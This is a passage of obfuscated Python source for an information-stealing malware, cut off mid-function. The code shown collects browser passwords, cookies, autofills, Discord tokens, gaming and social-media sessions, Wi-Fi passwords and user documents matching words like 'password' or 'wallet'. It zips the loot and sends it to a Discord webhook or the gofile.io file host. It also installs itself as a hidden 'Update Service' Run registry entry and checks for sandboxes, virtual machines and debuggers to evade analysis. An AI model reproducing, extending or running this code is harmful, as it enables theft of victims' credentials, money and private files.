                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","reddit_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1658
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1659
                    for O0O00O0OOO000OO0O in O00OOO0OO00O000OO :#line:1660
                        O000000OOO0OOO00O .write (O0O00O0OOO000OO0O )#line:1661
            if O0OO000O0O00OO000 :#line:1662
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","twitch_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1663
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1664
                    for O0OOOOO0OO00O0OOO in O0OO000O0O00OO000 :#line:1665
                        O000000OOO0OOO00O .write (O0OOOOO0OO00O0OOO )#line:1666
            if O0O0000O0O0O0O000 :#line:1667
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","spotify_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1668
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1669
                    for OO00OOOOOOOOOOO0O in O0O0000O0O0O0O000 :#line:1670
                        O000000OOO0OOO00O .write (OO00OOOOOOOOOOO0O )#line:1671
            if O0O0O0O0O00O0OO00 :#line:1672
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","roblox_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1673
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1674
                    for O0OO0000OO00OOO0O in O0O0O0O0O00O0OO00 :#line:1675
                        O000000OOO0OOO00O .write (O0OO0000OO00OOO0O )#line:1676
            if OO0OOOO00O0O0000O :#line:1677
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","steam_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1678
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1679
                    for OOOOOOOO0O00OO0OO in OO0OOOO00O0O0000O :#line:1680
                        O000000OOO0OOO00O .write (OOOOOOOO0O00OO0OO )#line:1681
            if Variables .DiscordAccounts :#line:1682
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","discord_accounts.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1683
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1684
                    for O0OOO0OO00OOOO000 in Variables .DiscordAccounts :#line:1685
                        O000000OOO0OOO00O .write (O0OOO0OO00OOOO000 )#line:1686
            if Variables .FullTokens :#line:1687
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","full_tokens.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1688
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1689
                    for O0OO0O0O00O0O000O in Variables .FullTokens :#line:1690
                        O000000OOO0OOO00O .write (O0OO0O0O00O0O000O +"\n")#line:1691
            if Variables .ValidatedTokens :#line:1692
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","validated_tokens.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1693
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1694
                    for OO00OOO0O0OOO0O00 in Variables .ValidatedTokens :#line:1695
                        O000000OOO0OOO00O .write (OO00OOO0O0OOO0O00 +"\n")#line:1696
            if Variables .Wifis :#line:1697
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"wifi_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1698
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1699
                    for O00O00O0OO00O0000 ,OO0O0000O0O0O0000 in Variables .Wifis :#line:1700
                        O000000OOO0OOO00O .write (f"WiFi Profile: {str(O00O00O0OO00O0000)}\nPassword: {str(OO0O0000O0O0O0000)}\n\n")#line:1701
            if Variables .SystemInfo :#line:1702
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"system_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1703
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1704
                    for O00000OO0OO0O00O0 in Variables .SystemInfo :#line:1705
                        O000000OOO0OOO00O .write (str (O00000OO0OO0O00O0 ))#line:1706
            if Variables .Network :#line:1707
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"network_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1708
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1709
                    for O0OO0O0O0OOO0OOO0 ,O0OOO0O0O0O0OO0O0 ,O0OO00000OOOOOOOO ,OO00OO00O0000O000 ,O0OOOOOOO00OO0O00 in Variables .Network :#line:1710
                        O000000OOO0OOO00O .write (O0OO0O0O0OOO0OOO0 +"\n"+O0OOO0O0O0O0OO0O0 +"\n"+O0OO00000OOOOOOOO +"\n"+OO00OO00O0000O000 +"\n"+O0OOOOOOO00OO0O00 )#line:1711
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions")))==0 :#line:1712
                try :#line:1713
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions"))#line:1714
                except :pass #line:1715
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens")))==0 :#line:1716
                try :#line:1717
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens"))#line:1718
                except :pass #line:1719
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers")))==0 :#line:1720
                try :#line:1721
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers"))#line:1722
                except :pass #line:1723
        except :pass #line:1724
    async def SendContains (O0OOO00OO00OO00OO )->None :#line:1725
        try :#line:1726
            O0O0O0O0O0O00O0OO =""#line:1727
            O0O000OO00OO00O00 =""#line:1728
            OOOO00O0OOO0OO00O =""#line:1729
            OO0O0OO0OOO000O00 =["gmail.com","live.com","zoho.com","tutanota.com","trashmail.com","gmx.net","safe-mail.net","thunderbird.net","mail.lycos.com","hushmail.com","mail.aol.com","icloud.com","protonmail.com","fastmail.com","rackspace.com","1and1.com","mailbox.org","mail.yandex.com","titan.email","youtube.com","nulled.to","cracked.to","tiktok.com","yahoo.com","gmx.com","aol.com","coinbase","mail.ru","rambler.ru","gamesense.pub","neverlose.cc","onetap.com","fatality.win","vape.gg","binance","ogu.gg","lolz.guru","xss.is","g2g.com","igvault.com","plati.ru","minecraft.net","primordial.dev","vacban.wtf","instagram.com","mail.ee","hotmail.com","facebook.com","vk.ru","x.synapse.to","hu2.app","shoppy.gg","app.sell","sellix.io","gmx.de","riotgames.com","mega.nz","roblox.com","exploit.in","breached.to","v3rmillion.net","hackforums.net","0x00sec.org","unknowncheats.me","godaddy.com","accounts.google.com","aternos.org","namecheap.com","hostinger.com","bluehost.com","hostgator.com","siteground.com","netafraz.com","iranserver.com","ionos.com","whois.com","te.eg","vultr.com","mizbanfa.net","neti.ee","osta.ee","cafe24.com","wpengine.com","parspack.com","cloudways.com","inmotionhosting.com","hinet.net","mihanwebhost.com","mojang.com","phoenixnap.com","dreamhost.com","rackspace.com","name.com","alibabacloud.com","a2hosting.com","contabo.com","xinnet.com","7ho.st","hetzner.com","domain.com","west.cn","iranhost.com","yisu.com","ovhcloud.com","000webhost.com","reg.ru","lws.fr","home.pl","sakura.ne.jp","matbao.net","scalacube.com","telia.ee","estoxy.com","zone.ee","veebimajutus.ee","beehosting.pro","core.eu","wavecom.ee","iphoster.net","cspacehostings.com","zap-hosting.com","iceline.com","zaphosting.com","cubes.com","chimpanzeehost.com","fatalityservers.com","craftandsurvive.com","mcprohosting.com","shockbyte.com","ggservers.com","scalacube.com","apexminecrafthosting.com","nodecraft.com","sparkedhost.com","pebblehost.com","ramshard.com","linkvertise.com","adf.ly","spotify.com","tv3play.ee","clarity.tk","messenger.com","snapchat.com","boltfood.eu","stuudium.com","ekool.eu","steamcommunity.com","epicgames.com","0x00sec.org","greysec.net","twitter.com","reddit.com","amazon.com","redengine.eu","eulencheats.com","4netplayers.com","velia.net","bybit.com","coinbase.com","ftx.com","ftx.us","binance.us","bitfinex.com","kraken.com","bitstamp.net","bittrex.com","kucoin.com","cex.io","gemini.com","blockfi.com","nexo.io","nordvpn.com","surfshark.com","privateinternetaccess.com","netflix.com","play.tv3.ee",".ope.ee","astolfo.lgbt","intent.store","novoline.wtf","flux.today","moonx.gg","novoline.lol","twitch.tv"]#line:1730
            for O00O00O0000OOOOOO in OO0O0OO0OOO000O00 :#line:1731
                O0O000OOOO0000OOO =False #line:1732
                O0OO0OO00O0O00O0O =False #line:1733
                O00O0OO0OOOOO0OOO =False #line:1734
                for O000OO00000O00OOO in Variables .Autofills :#line:1735
                    if O00O00O0000OOOOOO in O000OO00000O00OOO :#line:1736
                        O0O000OOOO0000OOO =True #line:1737
                        break #line:1738
                for OOO000OO00OO0OO00 in Variables .Passwords :#line:1740
                    if O00O00O0000OOOOOO in OOO000OO00OO0OO00 :#line:1741
                        O0OO0OO00O0O00O0O =True #line:1742
                        break #line:1743
                for O0O0OO0OO0OOO0OOO in Variables .Cookies :#line:1745
                    if O00O00O0000OOOOOO in O0O0OO0OO0OOO0OOO :#line:1746
                        O00O0OO0OOOOO0OOO =True #line:1747
                        break #line:1748
                if O0O000OOOO0000OOO :#line:1750
                    OOOO00O0OOO0OO00O +=O00O00O0000OOOOOO +", "#line:1751
                if O0OO0OO00O0O00O0O :#line:1753
                    O0O000OO00OO00O00 +=O00O00O0000OOOOOO +", "#line:1754
                if O00O0OO0OOOOO0OOO :#line:1756
                    O0O0O0O0O0O00O0OO +=O00O00O0000OOOOOO +", "#line:1757
            if not O0O0O0O0O0O00O0OO :#line:1758
                O0O0O0O0O0O00O0OO =None #line:1759
            if not O0O000OO00OO00O00 :#line:1760
                O0O000OO00OO00O00 =None #line:1761
            if not OOOO00O0OOO0OO00O :#line:1762
                OOOO00O0OOO0OO00O =None #line:1763
            OOOO0O00O0O0O00O0 ={"title":"***Shit***","description":f"***Keyword Result***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:1771
            O0OOOO00OO00O0OOO =[{"name":"Passwords","value":"```"+str (O0O000OO00OO00O00 )+"```","inline":False },{"name":"Autofills","value":"```"+str (OOOO00O0OOO0OO00O )+"```","inline":False },{"name":"Cookies","value":"```"+str (O0O0O0O0O0O00O0OO )+"```","inline":False },]#line:1775
            OOOO0O00O0O0O00O0 ["fields"]=O0OOOO00OO00O0OOO #line:1776
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOO0OO00OOO0OOOOO :#line:1777
                O00O00O0O00000O0O ={"username":"Shit","embeds":[OOOO0O00O0O0O00O0 ]}#line:1780
                OOO0OOO00OO0O0OO0 ={"Content-Type":"application/json"}#line:1782
                async with OOO0OO00OOO0OOOOO .post (webhook ,json =O00O00O0O00000O0O ,headers =OOO0OOO00OO0O0OO0 )as OO0OO00OOO00000O0 :#line:1783
                    pass #line:1784
        except Exception :#line:1785
            pass #line:1786
    async def SendAllData (OOO0OO0O000O000OO )->None :#line:1787
        O0O0OO00000OO0000 ="wmic csproduct get uuid"#line:1788
        O0OO0OO0OO0OO0000 =await asyncio .create_subprocess_shell (O0O0OO00000OO0000 ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:1794
        OO0O0000OOOO0OO00 ,O0000OOOOO0O00000 =await O0OO0OO0OO0OO0000 .communicate ()#line:1796
        OOOO0OO0OOO000O00 =OO0O0000OOOO0OO00 .decode (errors ="ignore").split ("\n")#line:1797
        O0O0OOOOO000OO00O =OOOO0OO0OOO000O00 [1 ].strip ()if len (OOOO0OO0OOO000O00 )>1 else "NONE"#line:1798
        OOOOOO00O0OO00O00 :str =os .path .join (OOO0OO0O000O000OO .Temp ,O0O0OOOOO000OO00O )#line:1799
        shutil .make_archive (OOOOOO00O0OO00O00 ,"zip",OOOOOO00O0OO00O00 )#line:1800
        OO0OO0OO00OOOOO0O ={"title":"***Shit***","description":f"***Info***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:1807
        OO0O00O00OO0O000O =[{"name":"Password","value":"``"+str (len (Variables .Passwords ))+"``","inline":True },{"name":"Card","value":"``"+str (len (Variables .Cards ))+"``","inline":True },{"name":"Cookie","value":"``"+str (len (Variables .Cookies )+len (OOO0OO0O000O000OO .FirefoxCookieList ))+"``","inline":True },{"name":"History","value":"``"+str (len (Variables .Historys )+len (OOO0OO0O000O000OO .FirefoxHistoryList ))+"``","inline":True },{"name":"Download","value":"``"+str (len (Variables .Downloads ))+"``","inline":True },{"name":"Bookmark","value":"``"+str (len (Variables .Bookmarks ))+"``","inline":True },{"name":"Autofill","value":"``"+str (len (Variables .Autofills )+len (OOO0OO0O000O000OO .FirefoxAutofiList ))+"``","inline":True },{"name":"Tokens","value":"``"+str (len (Variables .FullTokens ))+"``","inline":True },{"name":"Instagram","value":"``"+str (len (Variables .InstagramAccounts ))+"``","inline":True },{"name":"Twitter","value":"``"+str (len (Variables .TwitterAccounts ))+"``","inline":True },{"name":"TikTok","value":"``"+str (len (Variables .TikTokAccounts ))+"``","inline":True },{"name":"Twitch","value":"``"+str (len (Variables .TwtichAccounts ))+"``","inline":True },{"name":"Reddit","value":"``"+str (len (Variables .RedditAccounts ))+"``","inline":True },{"name":"Spotify","value":"``"+str (len (Variables .SpotifyAccounts ))+"``","inline":True },{"name":"Riot Game's","value":"``"+str (len (Variables .RiotGameAccounts ))+"``","inline":True },{"name":"Roblox","value":"``"+str (len (Variables .RobloxAccounts ))+"``","inline":True },{"name":"Steam","value":"``"+str (len (Variables .SteamAccounts ))+"``","inline":True },{"name":"Wifi","value":"``"+str (len (Variables .Wifis ))+"``","inline":True },{"name":"FireFox?","value":"``"+str (OOO0OO0O000O000OO .FireFox )+"``","inline":True },]#line:1827
        OO0OO0OO00OOOOO0O ["fields"]=OO0O00O00OO0O000O #line:1828
        async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as O0O0OOOOO000O0O0O :#line:1829
            OOO00OO0O0OO0OOOO ={"username":"Shit","embeds":[OO0OO0OO00OOOOO0O ]}#line:1832
            OOOOOOOOOOOOOO0O0 ={"Content-Type":"application/json"}#line:1834
            async with O0O0OOOOO000O0O0O .post (webhook ,json =OOO00OO0O0OO0OOOO ,headers =OOOOOOOOOOOOOO0O0 )as OO00OO00O000OOOOO :#line:1835
                pass #line:1836
            await OOO0OO0O000O000OO .SendContains ()#line:1837
            if not os .path .getsize (OOOOOO00O0OO00O00 +".zip")/(1024 *1024 )>15 :#line:1838
                with open (OOOOOO00O0OO00O00 +".zip",'rb')as OOOO0OOOO00O0OOOO :#line:1839
                    OO000O000OO00O0O0 =OOOO0OOOO00O0OOOO .read ()#line:1840
                OOO00OO0O0OO0OOOO =aiohttp .FormData ()#line:1841
                OOO00OO0O0OO0OOOO .add_field ('file',OO000O000OO00O0O0 ,filename =os .path .basename (OOOOOO00O0OO00O00 +".zip"))#line:1842
                async with O0O0OOOOO000O0O0O .post (webhook ,data =OOO00OO0O0OO0OOOO )as O0O0O0O0O00OO0000 :#line:1843
                    pass #line:1844
                del OOO00OO0O0OO0OOOO #line:1845
            else :#line:1847
                OO00OOO0OO00000OO =await UploadGoFile .upload_file (OOOOOO00O0OO00O00 +".zip")#line:1848
                if OO00OOO0OO00000OO !=None :#line:1849
                    O0OO0OO0O0000000O ={"title":"***Shit***","description":f"***Full Info***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:1856
                    OO000000OOOOOO0O0 =[{"name":"Download Link","value":f"[{O0O0OOOOO000OO00O}.zip]({OO00OOO0OO00000OO})","inline":True }]#line:1857
                    O0OO0OO0O0000000O ["fields"]=OO000000OOOOOO0O0 #line:1858
                    OO0O0O0OOOOO0OOOO ={"username":"Shit","embeds":[O0OO0OO0O0000000O ]}#line:1861
                    async with O0O0OOOOO000O0O0O .post (webhook ,json =OO0O0O0OOOOO0OOOO )as OO0O00O0OOO0O0O00 :#line:1862
                        pass #line:1863
                else :pass #line:1864
            try :#line:1865
                os .remove (OOOOOO00O0OO00O00 +".zip")#line:1866
                shutil .rmtree (OOOOOO00O0OO00O00 )#line:1867
            except :#line:1868
                pass #line:1869
class UploadGoFile :#line:1871
    @staticmethod #line:1872
    async def GetServer ()->str :#line:1873
        try :#line:1874
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O0O00OOO0 :#line:1875
                async with OO000O00O0O00OOO0 .get ("https://api.gofile.io/getServer")as O0O0000OO0000O000 :#line:1876
                    O0O00000000000OOO =await O0O0000OO0000O000 .json ()#line:1877
                    return O0O00000000000OOO ["data"]["server"]#line:1878
        except Exception :#line:1879
            return "store1"#line:1880
    @staticmethod #line:1881
    async def upload_file (OOOOO00000OOO0O00 :str )->str :#line:1882
        try :#line:1883
            OOO0000OOOOOO0OOO =await UploadGoFile .GetServer ()#line:1884
            O0O0OOO0OO0O0O0O0 =f"https://{OOO0000OOOOOO0OOO}.gofile.io/uploadFile"#line:1885
            async with aiohttp .ClientSession ()as O0O0OOO0OO0OO00OO :#line:1886
                O0OOOOO0OO0O000O0 =aiohttp .FormData ()#line:1887
                O0OOOOO0OO0O000O0 .add_field ('file',open (OOOOO00000OOO0O00 ,'rb'),filename =os .path .basename (OOOOO00000OOO0O00 ))#line:1888
                async with O0O0OOO0OO0OO00OO .post (O0O0OOO0OO0O0O0O0 ,data =O0OOOOO0OO0O000O0 )as OOO0OOOO0OOO000O0 :#line:1890
                    OOO00OO000OO00OOO =await OOO0OOOO0OOO000O0 .text ()#line:1891
                    O0O00O0OOOOOO0O00 =json .loads (OOO00OO000OO00OOO )#line:1893
                    O00O0000O00O0OOOO =json .dumps (O0O00O0OOOOOO0O00 )#line:1894
                    O00OO0OO00O000O00 =json .loads (O00O0000O00O0OOOO )#line:1895
                    OO00O000OOOO0O0OO =O00OO0OO00O000O00 ['data']['downloadPage']#line:1897
                    return OO00O000OOOO0O0OO #line:1898
        except Exception :#line:1899
            return None #line:1900
class StealCommonFiles :#line:1902
    def __init__ (OO00OO0O0OO0OOOO0 )->None :#line:1903
        OO00OO0O0OO0OOOO0 .temp =os .getenv ("temp")#line:1904
    async def StealFiles (OO0000O00000O0OO0 )->None :#line:1906
        try :#line:1907
            OO0O00O0O00OOOO00 =(("Desktop",os .path .join (os .getenv ("userprofile"),"Desktop")),("Desktop2",os .path .join (os .getenv ("userprofile"),"OneDrive","Desktop")),("Pictures",os .path .join (os .getenv ("userprofile"),"Pictures")),("Documents",os .path .join (os .getenv ("userprofile"),"Documents")),("Music",os .path .join (os .getenv ("userprofile"),"Music")),("Videos",os .path .join (os .getenv ("userprofile"),"Videos")),("Downloads",os .path .join (os .getenv ("userprofile"),"Downloads")),)#line:1916
            O0OOO00OOOOO0O000 =os .path .join (OO0000O00000O0OO0 .temp ,"Shittingfiles")#line:1918
            if not os .path .exists (O0OOO00OOOOO0O000 ):#line:1920
                os .makedirs (O0OOO00OOOOO0O000 )#line:1921
            O0OOO0O0OO0000000 =["secret","password","account","tax","key","wallet","backup"]#line:1923
            OO0OOO0O0O0O000OO =[".txt",".doc",".docx",".png",".pdf",".jpg",".jpeg",".csv",".mp3",".mp4",".xls",".xlsx",".zip"]#line:1924
            for _OOO00O000OOOOOOOO ,O0O00O0OO0000O000 in OO0O00O0O00OOOO00 :#line:1926
                if os .path .isdir (O0O00O0OO0000O000 ):#line:1927
                    for O0OOOOO0OO000OOO0 ,_OOO00O000OOOOOOOO ,OO0OOO0000OOOO0O0 in os .walk (O0O00O0OO0000O000 ):#line:1928
                        for OOOO000OO0O0OOOO0 in OO0OOO0000OOOO0O0 :#line:1929
                            OOO0OO0OOOO00O0OO =os .path .join (O0OOOOO0OO000OOO0 ,OOOO000OO0O0OOOO0 )#line:1930
                            _OOO00O000OOOOOOOO ,OO000OO000OOO00OO =os .path .splitext (OOOO000OO0O0OOOO0 )#line:1932
                            if (OO000OO000OOO00OO .lower ()in OO0OOO0O0O0O000OO and os .path .getsize (OOO0OO0OOOO00O0OO )<2 *1024 *1024 or any (O0000OOOO0OOO0000 in OOOO000OO0O0OOOO0 .lower ()for O0000OOOO0OOO0000 in O0OOO0O0OO0000000 )):#line:1937
                                O0O000OO000OO0OO0 =os .path .basename (os .path .normpath (O0OOOOO0OO000OOO0 ))#line:1938
                                OO00OO0OOOO00000O =os .path .join (O0OOO00OOOOO0O000 ,O0O000OO000OO0OO0 )#line:1939
                                if not os .path .exists (OO00OO0OOOO00000O ):#line:1941
                                    os .makedirs (OO00OO0OOOO00000O )#line:1942
                                O0OOOOOOO0O0OO0OO =os .path .join (OO00OO0OOOO00000O ,OOOO000OO0O0OOOO0 )#line:1944
                                shutil .copy2 (OOO0OO0OOOO00O0OO ,O0OOOOOOO0O0OO0OO )#line:1945
            shutil .make_archive (O0OOO00OOOOO0O000 ,'zip',O0OOO00OOOOO0O000 )#line:1947
            O000O0OO0O0O0O0OO =await UploadGoFile .upload_file (O0OOO00OOOOO0O000 +".zip")#line:1948
            if not O000O0OO0O0O0O0OO ==None :#line:1949
                async with aiohttp .ClientSession ()as OO00O00O0O000OOO0 :#line:1950
                    O0OOO0O00OOO0O000 ={"title":"***Shit***","description":f"***Shit***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:1957
                    O000000OO00OO00OO =[{"name":"Download Link","value":f"[Files.zip]({O000O0OO0O0O0O0OO})","inline":True }]#line:1958
                    O0OOO0O00OOO0O000 ["fields"]=O000000OO00OO00OO #line:1959
                    OO0OOOOOO00O0O000 ={"username":"Shit","embeds":[O0OOO0O00OOO0O000 ]}#line:1962
                    async with OO00O00O0O000OOO0 .post (webhook ,json =OO0OOOOOO00O0O000 )as OOO000O0OOOOOOOO0 :#line:1963
                        pass #line:1964
            try :#line:1965
                os .remove (O0OOO00OOOOO0O000 +".zip")#line:1966
                shutil .rmtree (O0OOO00OOOOO0O000 )#line:1967
            except :#line:1968
                pass #line:1969
        except :#line:1970
            pass #line:1971
class Startup :#line:1974
    def __init__ (OO0O0OO0OO0OO00O0 )->None :#line:1975
        OO0O0OO0OO0OO00O0 .LocalAppData =os .getenv ("LOCALAPPDATA")#line:1976
        OO0O0OO0OO0OO00O0 .RoamingAppData =os .getenv ("APPDATA")#line:1977
        OO0O0OO0OO0OO00O0 .CurrentFile =os .path .abspath (sys .argv [0 ])#line:1978
        OO0O0OO0OO0OO00O0 .Privalage :bool =SubModules .IsAdmin ()#line:1979
        OO0O0OO0OO0OO00O0 .ToPath :str =os .path .join (OO0O0OO0OO0OO00O0 .LocalAppData ,"Shit","shitting.exe")#line:1980
    async def main (O00OO0000O0OO00OO )->None :#line:1981
        await O00OO0000O0OO00OO .CreatePathAndMelt ()#line:1982
        if startup_method =="regedit":#line:1983
            await O00OO0000O0OO00OO .RegeditStartup ()#line:1984
        else :pass #line:1985
    async def CreatePathAndMelt (OO0O00OOO000OO00O )->None :#line:1986
        try :#line:1987
            if os .path .exists (OO0O00OOO000OO00O .ToPath ):#line:1988
                return #line:1989
            else :#line:1990
                os .mkdir (OO0O00OOO000OO00O .ToPath .replace ("Shit.exe",""))#line:1991
                shutil .copyfile (OO0O00OOO000OO00O .CurrentFile ,OO0O00OOO000OO00O .ToPath )#line:1992
                O00O0000OO0OOOOOO =await asyncio .create_subprocess_shell (f'attrib +h +s "{OO0O00OOO000OO00O.ToPath}"',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:1997
                await O00O0000OO0OOOOOO .communicate ()#line:1998
        except Exception :#line:1999
            pass #line:2000
    async def RegeditStartup (O000O0OOO0OOO00OO )->None :#line:2001
        try :#line:2002
            if not O000O0OOO0OOO00OO .Privalage :#line:2003
                OOO0OOO0OOO000O0O =await asyncio .create_subprocess_shell (f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{O000O0OOO0OOO00OO.ToPath}" /f',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2008
                await OOO0OOO0OOO000O0O .communicate ()#line:2009
            else :#line:2010
                OOO0OOO0OOO000O0O =await asyncio .create_subprocess_shell (f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shitting Update Service" /t REG_SZ /d "{O000O0OOO0OOO00OO.ToPath}" /f',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2015
                await OOO0OOO0OOO000O0O .communicate ()#line:2016
        except Exception :#line:2017
            pass #line:2018
class AntiDebug :#line:2020
    def __init__ (OOOO0OO0OOOO0OO00 )->None :#line:2021
        OOOO0OO0OOOO0OO00 .banned_uuids =["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","71DC2242-6EA2-C40B-0798-B4F5B4CC8776","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4"]#line:2023
        OOOO0OO0OOOO0OO00 .banned_computer_names =["WDAGUtilityAccount","Harry Johnson","JOANNA","WINZDS-21T43RNG","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","COMPNAME_4491","WILEYPC","WORK","KATHLROGE","DESKTOP-TKGQ6GH","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","DESKTOP-NNSJYNR","JULIA-PC","DESKTOP-BQISITB","d1bnJkfVlH"]#line:2026
        OOOO0OO0OOOO0OO00 .banned_process =["HTTP Toolkit.exe","httpdebuggerui.exe","wireshark.exe","fiddler.exe","regedit.exe","taskmgr.exe","vboxservice.exe","df5serv.exe","processhacker.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","ida64.exe","ollydbg.exe","pestudio.exe","vmwareuser.exe","vgauthservice.exe","vmacthlp.exe","x96dbg.exe","vmsrvc.exe","x32dbg.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","ksdumperclient.exe","ksdumper.exe","joeboxserver.exe"]#line:2028
    async def FunctionRunner (O0O0O0O0000O00000 ):#line:2030
        OOO0000000O000000 =[asyncio .create_task (O0O0O0O0000O00000 .check_system ()),asyncio .create_task (O0O0O0O0000O00000 .kill_process ())]#line:2032
        await asyncio .gather (*OOO0000000O000000 )#line:2033
    async def check_system (O0O0O00O00O00O0OO )->None :#line:2034
        O0000O0OO00OOOO0O ="wmic csproduct get uuid"#line:2035
        OOOOO00O0OO0OO000 =await asyncio .create_subprocess_shell (O0000O0OO00OOOO0O ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2040
        O00000O0O00O0O00O ,O0OOOO0OO0000000O =await OOOOO00O0OO0OO000 .communicate ()#line:2041
